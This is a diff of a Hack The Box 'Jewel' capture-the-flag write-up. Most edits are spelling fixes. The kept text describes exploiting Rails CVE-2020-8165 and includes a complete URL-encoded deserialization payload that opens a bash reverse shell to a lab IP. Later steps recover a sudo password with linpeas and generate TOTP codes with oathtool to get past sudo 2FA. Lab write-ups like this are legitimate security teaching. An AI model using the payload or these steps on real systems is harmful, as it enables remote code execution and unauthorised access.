@@ -1,6 +1,6 @@
 ![](jewel_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -65,9 +65,9 @@ PORT     STATE SERVICE VERSION
 		❯ grep -n rail Gemfile
 		7:gem 'rails', '= 5.2.2.1'
 
-* viewing the [release notes](https://weblog.rubyonrails.org/releases/) this version is released on March 13, 2019 and there is a deserialization vulnerability in the rails < 5.2.4.3, rails < 6.0.3.1
+* viewing the [release notes](https://weblog.rubyonrails.org/releases/) this version is released on March 13, 2019 and there is a de-serialization vulnerability in the rails < 5.2.4.3, rails < 6.0.3.1
 
-  **CVE-2020-8165:** A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.
+  **CVE-2020-8165:** A de-serialization of untrusted data vulnerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to un-marshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.
 
   **Exploit PoC:** [masahiro331@github.com](https://github.com/masahiro331/CVE-2020-8165)
 
@@ -75,11 +75,11 @@ PORT     STATE SERVICE VERSION
 
 * what this report says is that -
 
-  There is potentially unexpected behaviour in the MemCacheStore and RedisCacheStore where, when untrusted user input is written to the cache store using the `raw: true` parameter, re-reading the result from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:
+  There is potentially unexpected behavior in the MemCacheStore and RedisCacheStore where, when untrusted user input is written to the cache store using the `raw: true` parameter, re-reading the result from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:
 
 	  data = cache.fetch("demo", raw: true) { untrusted_string } 
 
-* verifing this in our code:
+* verifying this in our code:
 
 	  ❯ grep -r 'raw: true'
 	  app/controllers/application_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
@@ -155,14 +155,14 @@ this give us usr encoded payload.
 %04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3A%60bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.15.71%2F4141+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
 -->
 
-* start netcat, intercet the username update request in burp, past payload in username field and forward the request and then refresh the page and payload get execute and we get shell.
+* start netcat, intercept the username update request in burp, past payload in username field and forward the request and then refresh the page and payload get execute and we get shell.
 
   ![](screenshots/jewel-foothold.GIF)
 
 
 # Privilege Escalation
 
-* Running linpeas with `-a` one funny thing heppend i get sudo password of user bill:
+* Running linpeas with `-a` one funny thing happened i get sudo password of user bill:
 
   ![](screenshots/linpeas-bruteforce.png)
 
@@ -222,9 +222,9 @@ this give us usr encoded payload.
 	  " TOTP_AUTH
 
 * we can use that same code in any Oauth app to create that Verification code for sudo. i use this chrome [authenticator](https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai?hl=en) addon
-  * but success is not that easy, because in 2FA depend on clock time and if both ends time is diffrent while generating code it never works.
+  * but success is not that easy, because in 2FA depend on clock time and if both ends time is different while generating code it never works.
 
-* spend so much time try to sync with the box time and then found [oathtool](https://packages.debian.org/sid/oathtool) that run from terminal and creats OTP using totp code. 
+* spend so much time try to sync with the box time and then found [oathtool](https://packages.debian.org/sid/oathtool) that run from terminal and create OTP using totp code. 
 
 * My technique is to upload the oathtool in the box and run form the box so that i don't need to sync box time and my machine time because i'm running on same box.
   * but this is not easy because oathtool is not a single executable binary file, it depends on some Shared libraries and while running the oathtool binary it give an error of missing library:
